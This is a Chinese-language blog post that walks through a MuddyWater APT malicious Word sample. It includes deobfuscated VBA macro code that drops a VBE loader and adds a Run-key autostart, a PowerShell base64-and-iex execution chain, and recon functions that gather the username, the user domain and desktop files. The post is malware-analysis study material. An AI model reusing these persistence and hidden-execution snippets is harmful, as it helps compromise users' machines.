<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="逆向,">





  <link rel="alternate" href="/atom.xml" title="偽のブログ" type="application/atom+xml">






<meta name="description" content="本文分析作为学习参考的笔记记录.记录整体细节和不曾知道的地方. 参考与学习的地址为:https://bbs.pediy.com/thread-252477.htm 脚本类恶意程序分析技巧汇总:https://bbs.pediy.com/thread-251102.htm https://www.cnblogs.com/ichunqiu/p/8659004.html 谢谢师傅的分析文章. 样本分析微">
<meta name="keywords" content="逆向">
<meta property="og:type" content="article">
<meta property="og:title" content="MuddyWater(污水) APT样本分析">
<meta property="og:url" content="http://xwdidi.top/2019/10/06/2019-10-06-MuddyWater(污水) APT分析/index.html">
<meta property="og:site_name" content="偽のブログ">
<meta property="og:description" content="本文分析作为学习参考的笔记记录.记录整体细节和不曾知道的地方. 参考与学习的地址为:https://bbs.pediy.com/thread-252477.htm 脚本类恶意程序分析技巧汇总:https://bbs.pediy.com/thread-251102.htm https://www.cnblogs.com/ichunqiu/p/8659004.html 谢谢师傅的分析文章. 样本分析微">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://i.loli.net/2019/09/30/TFZtEuR9N4Jc5pj.png">
<meta property="og:image" content="https://i.loli.net/2019/09/30/hwzPVutOI8raYJH.png">
<meta property="og:image" content="https://i.loli.net/2019/09/30/ovtTYUskGDfQr9j.png">
<meta property="og:image" content="https://i.loli.net/2019/10/01/LsIdhwHNiKDA58J.png">
<meta property="og:image" content="https://i.loli.net/2019/10/01/7xf1e3Gio4Kha5B.png">
<meta property="og:image" content="http://xwdidi.top/2019/10/06/2019-10-06-MuddyWater(污水)%20APT分析/![image.png](https://i.loli.net/2019/10/01/7xf1e3Gio4Kha5B.png">
<meta property="og:image" content="https://i.loli.net/2019/10/01/YfGXswl4WAt3PJx.png">
<meta property="og:image" content="https://i.loli.net/2019/10/01/lmN4Lg3Vtb67aj8.png">
<meta property="og:image" content="https://i.loli.net/2019/10/01/fPIcY76Jm9MKVgB.png">
<meta property="og:image" content="https://i.loli.net/2019/10/01/qgUpVZ29GdFXS4T.png">
<meta property="og:image" content="https://i.loli.net/2019/10/01/cFQ8ZgYNJMmoaud.png">
<meta property="og:image" content="https://i.loli.net/2019/10/01/ovf9WC7StRUhTix.png">
<meta property="og:image" content="https://i.loli.net/2019/10/01/kJ7VhFmIZYNH1ln.png">
<meta property="og:image" content="https://i.loli.net/2019/10/02/RDgfKCjoh7FGUqB.png">
<meta property="og:image" content="https://i.loli.net/2019/10/02/jqATBFtdcHDkI8i.png">
<meta property="og:image" content="https://i.loli.net/2019/10/02/euh924LDNOybrXF.png">
<meta property="og:image" content="https://i.loli.net/2019/10/02/pX6JFcCebHuMEhI.png">
<meta property="og:image" content="https://i.loli.net/2019/10/02/pC64S9NomiXjFcr.png">
<meta property="og:image" content="https://i.loli.net/2019/10/06/ofkVKibWSslyu12.png">
<meta property="og:image" content="https://i.loli.net/2019/10/07/HuaI5mAXDM7gOiP.png">
<meta property="og:updated_time" content="2019-10-08T17:35:11.492Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="MuddyWater(污水) APT样本分析">
<meta name="twitter:description" content="本文分析作为学习参考的笔记记录.记录整体细节和不曾知道的地方. 参考与学习的地址为:https://bbs.pediy.com/thread-252477.htm 脚本类恶意程序分析技巧汇总:https://bbs.pediy.com/thread-251102.htm https://www.cnblogs.com/ichunqiu/p/8659004.html 谢谢师傅的分析文章. 样本分析微">
<meta name="twitter:image" content="https://i.loli.net/2019/09/30/TFZtEuR9N4Jc5pj.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Xuwei98'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://xwdidi.top/2019/10/06/2019-10-06-MuddyWater(污水) APT分析/">





  <title>MuddyWater(污水) APT样本分析 | 偽のブログ</title>
  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-124001254-1', 'auto');
  ga('send', 'pageview');
</script>





</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">偽のブログ</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://xwdidi.top/2019/10/06/2019-10-06-MuddyWater(污水) APT分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Xuwei98">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="偽のブログ">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">MuddyWater(污水) APT样本分析</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-06T01:00:00+09:00">
                2019-10-06
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/样本分析/" itemprop="url" rel="index">
                    <span itemprop="name">样本分析</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/10/06/2019-10-06-MuddyWater(污水) APT分析/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/10/06/2019-10-06-MuddyWater(污水) APT分析/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
            </span>
          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  3.1k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  14
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>本文分析作为学习参考的笔记记录.记录整体细节和不曾知道的地方.</p>
<p>参考与学习的地址为:<a href="https://bbs.pediy.com/thread-252477.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-252477.htm</a></p>
<p>脚本类恶意程序分析技巧汇总:<a href="https://bbs.pediy.com/thread-251102.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-251102.htm</a></p>
<p><a href="https://www.cnblogs.com/ichunqiu/p/8659004.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/8659004.html</a></p>
<p>谢谢师傅的分析文章.</p>
<h3 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h3><p>微步在线搜寻md5=6cb076f1f42573c5c43083a89bcfe442,下载样本文件并且改名.虚拟机使用<code>Office Tool Plus</code>安装office.</p>
<p>使用hashcalc:    </p>
<table>
<thead>
<tr>
<th style="text-align:left">SHA1</th>
<th>4e68e2040acade6369d938f96c95ada050a8e061</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">SHA-256</td>
<td>36ccae4dffc70249c79cd3156de1cd238af8f7a3e47dc90a1c33476cf97a77b0</td>
</tr>
</tbody>
</table>
<h3 id="恶意宏代码"><a href="#恶意宏代码" class="headerlink" title="恶意宏代码"></a>恶意宏代码</h3><p><code>OfficeMalScanner.exe  &quot;Zakupki_Agency on Public Procurement.doc&quot;  info</code>提取宏汇编,<code>atl+F11</code>打开VBA编辑器然后启动内容也可以.</p>
<p>五个文件分别是:<img src="https://i.loli.net/2019/09/30/TFZtEuR9N4Jc5pj.png" alt></p>
<h4 id="1-ThisDocument"><a href="#1-ThisDocument" class="headerlink" title="1.ThisDocument"></a>1.ThisDocument</h4><p><img src="https://i.loli.net/2019/09/30/hwzPVutOI8raYJH.png" alt="image.png"></p>
<p>动态调试F8,会跳出UTF-8窗口.跳转到frmLoadr.Show函数内部.</p>
<h4 id="2-frmLoadr"><a href="#2-frmLoadr" class="headerlink" title="2.frmLoadr"></a>2.frmLoadr</h4><p><img src="https://i.loli.net/2019/09/30/ovtTYUskGDfQr9j.png" alt="image.png"></p>
<p>按钮调用buttonQWERTY_Click()函数.给RgSH传入参数7.然后动态调试跳转到<code>RgSH(id)函数</code></p>
<h4 id="3-RgSH-id"><a href="#3-RgSH-id" class="headerlink" title="3. RgSH(id)"></a>3. RgSH(id)</h4><p><img src="https://i.loli.net/2019/10/01/LsIdhwHNiKDA58J.png" alt="image.png"></p>
<p>根据mlw()函数解密,写一个小脚本就行,再使用MsgBox()打印,这里有个细节oor的时候进行了字符逆序,所以脚本最好添加.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">char = <span class="string">"""sP = mlw(1353) &amp; mlw(1346) &amp; mlw(1349) &amp; mlw(1315) &amp; mlw(1338) &amp; mlw(1336) &amp; mlw(1317) &amp; mlw(1335) &amp; mlw(1351)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1318) &amp; mlw(1293) &amp; mlw(1351) &amp; mlw(1343) &amp; mlw(1352) &amp; mlw(1332) &amp; mlw(1337) &amp; mlw(1336) &amp; mlw(1335)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1327) &amp; mlw(1351) &amp; mlw(1346) &amp; mlw(1346) &amp; mlw(1349) &amp; mlw(1327) &amp; mlw(1281) &amp; mlw(1327) &amp; mlw(1327)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1268) &amp; mlw(1360) &amp; mlw(1336) &amp; mlw(1351) &amp; mlw(1332) &amp; mlw(1345) &amp; mlw(1346) &amp; mlw(1350) &amp; mlw(1349)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1336) &amp; mlw(1347) &amp; mlw(1344) &amp; mlw(1340) &amp; mlw(1267) &amp; mlw(1296) &amp; mlw(1267) &amp; mlw(1343) &amp; mlw(1336)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1353) &amp; mlw(1336) &amp; mlw(1311) &amp; mlw(1345) &amp; mlw(1346) &amp; mlw(1340) &amp; mlw(1351) &amp; mlw(1332) &amp; mlw(1345)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1346) &amp; mlw(1350) &amp; mlw(1349) &amp; mlw(1336) &amp; mlw(1347) &amp; mlw(1344) &amp; mlw(1340) &amp; mlw(1358) &amp; mlw(1293)</span></span><br><span class="line"><span class="string">sP = sP &amp; mlw(1350) &amp; mlw(1351) &amp; mlw(1344) &amp; mlw(1338) &amp; mlw(1344) &amp; mlw(1345) &amp; mlw(1340) &amp; mlw(1354) """</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#去除多余字符</span></span><br><span class="line">char = char.replace(<span class="string">"sP"</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">"="</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">"mlw("</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">")"</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">" "</span>,<span class="string">""</span>)</span><br><span class="line">char = char.replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">num = char.split(<span class="string">"&amp;"</span>)</span><br><span class="line"><span class="comment">#字符转数字</span></span><br><span class="line">num = list(map(int,num))</span><br><span class="line">chr = []</span><br><span class="line"><span class="comment">#逆序打印 </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(num)<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">	num[i] = num[i] <span class="number">-1235</span></span><br><span class="line">	print(<span class="string">"chr("</span>+ str(num[i]) +<span class="string">")"</span>,end=<span class="string">''</span>)</span><br><span class="line">	<span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">		print(<span class="string">"&amp;"</span>,end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/10/01/7xf1e3Gio4Kha5B.png" alt="image.png"></p>
<p>最后所有除掉混淆是这样子的.</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> RgSH(id)</span><br><span class="line">b = PuSH(id)	</span><br><span class="line">CallByName <span class="string">"winmgmts:&#123;impersonationLevel = impersonate&#125;!\\.\root\default:StdRegProv"</span>, </span><br><span class="line"><span class="string">"SetStringValue"</span>, </span><br><span class="line">VbMethod, </span><br><span class="line">&amp;H80000001, </span><br><span class="line"><span class="string">"Software\Microsoft\Windows\CurrentVersion\Run"</span>, </span><br><span class="line"><span class="string">"VingValue"</span>, </span><br><span class="line"> b</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure>
<p>然后动态调试后b的值为%Temp%\aulmgr.vbe,其中<code>PuSH(id)</code>函数下面会继续分析</p>
<p><a href="https://msdn.microsoft.com/ja-jp/windows/aa393600(v=vs.80" target="_blank" rel="noopener">以这个为参考</a>)得出这个函数大概作用是获取本地注册表对象,调用<code>SetStringValue</code>,在注册表项为<code>Software\Microsoft\Windows\CurrentVersion\Run</code>,创建键名为”VingValue”,并设定值为b.</p>
<h4 id="PuSH-id"><a href="#PuSH-id" class="headerlink" title="PuSH(id)"></a>PuSH(id)</h4><p><img src="![image.png](https://i.loli.net/2019/10/01/7xf1e3Gio4Kha5B.png" alt>)</p>
<p>传入参数7;</p>
<p>执行函数<code>p = d3r(4) &amp; FuN(1)</code>.先运行跳过得到<code>p = %TEMP%\aulmgr.vbe</code></p>
<p>然后进行<code>If id Mod 5 = 1</code>如果id模5得1则进行下面的操作:利用<code>CreateTextFile</code>创建<code>%Temp%\aulmgr.vbe,</code>对象并写入标题拼接1-13拼接出来的ddd字符串.</p>
<h4 id="d3r-id1"><a href="#d3r-id1" class="headerlink" title="d3r(id1)"></a>d3r(id1)</h4><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> d3r(id)</span><br><span class="line"><span class="keyword">Set</span> f = <span class="built_in">CreateObject</span>(<span class="string">"scriPtInG.filesystemObJEct"</span>)</span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">Case</span> (id Mod <span class="number">5</span>)</span><br><span class="line"><span class="keyword">Case</span> <span class="number">0</span></span><br><span class="line">d3r = Environ$(<span class="string">"puBLiC"</span>)	获取<span class="string">"public"</span>环境便量路径</span><br><span class="line"><span class="keyword">Case</span> <span class="number">1</span></span><br><span class="line">d3r = Environ$(<span class="string">"aPpDaTa"</span>)  获取<span class="string">"aPpDaTa"</span>环境便量路径</span><br><span class="line"><span class="keyword">Case</span> <span class="number">2</span></span><br><span class="line">d3r = f.getspecialfolder(<span class="number">0</span>) 获取%SystemRoot%</span><br><span class="line"><span class="keyword">Case</span> <span class="number">3</span></span><br><span class="line">d3r = f.getspecialfolder(<span class="number">1</span>)获取<span class="string">"%SystemRoot%\System32环境便量路径</span></span><br><span class="line"><span class="string">Case 4</span></span><br><span class="line"><span class="string">d3r = f.getspecialfolder(2)获取%Temp%环境便量路径</span></span><br><span class="line"><span class="string">Case Else</span></span><br><span class="line"><span class="string">d3r = ""</span></span><br><span class="line"><span class="string">End Select</span></span><br><span class="line"><span class="string">End Function</span></span><br></pre></td></tr></table></figure>
<p>去除混淆</p>
<p><code>FiSA()</code>每次都返回”scriPtInG.filesystemObJEct”.流式文本对象.</p>
<p><code>getspecialfolder(id)</code>是vbs自带的函数,根据参数的不同获得的值也不一样,0=WindowsFolder,1=SystemFolder,2=TemporaryFolder.</p>
<h4 id="FuN-id"><a href="#FuN-id" class="headerlink" title="FuN(id)"></a>FuN(id)</h4><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> FuN(id)</span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">Case</span> (id Mod <span class="number">5</span>)</span><br><span class="line"><span class="keyword">Case</span> <span class="number">0</span></span><br><span class="line">FuN = <span class="string">"\aaaaa.tmp"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="number">1</span></span><br><span class="line">FuN = <span class="string">"\aulngr.vbe"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="number">2</span></span><br><span class="line">FuN = <span class="string">"\bbbbbb.tmp"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="number">3</span></span><br><span class="line">FuN = <span class="string">"\report.xls"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="number">4</span></span><br><span class="line">FuN = <span class="string">"\report.docx"</span></span><br><span class="line"><span class="keyword">Case</span> <span class="keyword">Else</span></span><br><span class="line">FuN = <span class="string">""</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Select</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure>
<p>宏代码 功能总结</p>
<p>释放<strong>VBE Loader**</strong>于%temp%\aulmgr.vbe下,并且注册表修改为开机自启动.</p>
<h3 id="aulngr-vbe-分析"><a href="#aulngr-vbe-分析" class="headerlink" title="aulngr.vbe 分析"></a>aulngr.vbe 分析</h3><p><img src="https://i.loli.net/2019/10/01/YfGXswl4WAt3PJx.png" alt="image.png"></p>
<table>
<thead>
<tr>
<th>md5</th>
<th>9d2da5228e21594ab46b4f5281d38b8f</th>
</tr>
</thead>
<tbody>
<tr>
<td>sha1</td>
<td>2b548816eeacd4fd4dee30f46acaecb34b1238e3</td>
</tr>
</tbody>
</table>
<p>文本看不太懂,根据师傅的报告进行恢复.解除编码后大概这个样子</p>
<p><img src="https://i.loli.net/2019/10/01/lmN4Lg3Vtb67aj8.png" alt="image.png"></p>
<p>中间混淆了一大堆看不太懂的的东西,只能看师傅的学习分析.</p>
<p>去除掉大多数的杂鱼信息,关键字集中在shell</p>
<p><img src="https://i.loli.net/2019/10/01/fPIcY76Jm9MKVgB.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2019/10/01/qgUpVZ29GdFXS4T.png" alt="image.png"></p>
<p>取b的值存储到<code>%public%\UserImage.png</code>中,再使用powershell运行它.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/w: -w is short <span class="keyword">for</span> -WindowStyle</span><br><span class="line">Normal (<span class="number">0</span>)</span><br><span class="line">Maximized (<span class="number">3</span>)</span><br><span class="line">Minimized (<span class="number">2</span>)</span><br><span class="line">Hidden (<span class="number">1</span>)</span><br><span class="line">gc: <span class="built_in">Get-Content</span> 获取内容</span><br><span class="line">iex: <span class="built_in">Invoke-Expression</span>  调用表达式</span><br></pre></td></tr></table></figure>
<p><a href="https://stackoverflow.com/questions/55775202/what-is-w-1-and-c-in-powershell-command" target="_blank" rel="noopener">参考</a></p>
<p>然后分析下b的字符串.将base64编码后的字符串存入vv,然后赋予到er变量.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$er</span> = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(<span class="variable">$vv</span>));&amp; (gcm i*v*p*s*n) <span class="variable">$er</span></span><br></pre></td></tr></table></figure>
<p>然后运行后面的表达式.那<code>gcm i*v*p*s*n</code>是什么呢,powershell跑一下就行了,唯一匹配iex,也就是调用它.<code>$er</code>的意思就是base64解码后按照unicode解析字符串.</p>
<p>运行一下得到powershell代码的UserImage.png.</p>
<h3 id="UserImage-png"><a href="#UserImage-png" class="headerlink" title="UserImage.png"></a>UserImage.png</h3><p>C:\Users\Public\UserImage.png(%public%\UserImage.png)</p>
<table>
<thead>
<tr>
<th>md5</th>
<th>34a072f42905f9de31523616e8f207b1</th>
</tr>
</thead>
<tbody>
<tr>
<td>SHA1</td>
<td>3d37affb081e7c9586bdac2fe9e45368f812ceb4</td>
</tr>
</tbody>
</table>
<p>解码其中的base64编码后的powershell代码.使用<a href="http://prettyprinter.de/" target="_blank" rel="noopener">http://prettyprinter.de</a>略微格式化一下.然后ise中调试.</p>
<h4 id="powershell函数分析"><a href="#powershell函数分析" class="headerlink" title="powershell函数分析"></a>powershell函数分析</h4><h5 id="lTXxzy53"><a href="#lTXxzy53" class="headerlink" title="lTXxzy53()"></a>lTXxzy53()</h5><p><img src="https://i.loli.net/2019/10/01/cFQ8ZgYNJMmoaud.png" alt="image.png">所有函数都如上面一样加密过,动态调试运行<code>i98mG9I84cHnev2ywJGZ</code>解密就行.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> lTXxzy53()</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">try</span>&#123;<span class="variable">$whj95r69Xal</span> = <span class="variable">$ENV:USERNAME</span>;&#125;</span><br><span class="line">       <span class="keyword">catch</span>&#123;<span class="variable">$whj95R69xAl</span> = (<span class="string">'Error Username'</span>);&#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$whJ95r69xAl</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>获得环境变量下的用户名称.</p>
<h5 id="NIQCw20"><a href="#NIQCw20" class="headerlink" title="NIQCw20"></a>NIQCw20</h5><p>不太懂</p>
<h5 id="EdA4VNZrBAU37Pd7ND"><a href="#EdA4VNZrBAU37Pd7ND" class="headerlink" title="EdA4VNZrBAU37Pd7ND()"></a>EdA4VNZrBAU37Pd7ND()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> EdA4VNZrBAU37Pd7ND()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$BtvwpfSFUmi_</span> = <span class="variable">$Env:eDA4VNZrBAU37pD7Nd</span>;&#125;</span><br><span class="line">	<span class="keyword">catch</span>&#123;<span class="variable">$btvwpfSfumI_</span> = (<span class="string">'Error UserDomain'</span>);&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$BTvwpfSFumI_</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据下面的提示应该是用户域的名称 <code>%userdomain%</code></p>
<h5 id="UTFhxPjChlXs1OxREdR"><a href="#UTFhxPjChlXs1OxREdR" class="headerlink" title="UTFhxPjChlXs1OxREdR()"></a>UTFhxPjChlXs1OxREdR()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> UTFhxPjChlXs1OxREdR()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$a3rm5By20VTEfgF04</span> = ls <span class="variable">$enV:USERPROFILE</span>\Desktop;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$A3rm5BY20vteFgF04</span> =<span class="string">"Error ls"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$A3rm5bY20vtEFGF04</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ls遍历桌面文件,错误反汇Errot ls.</p>
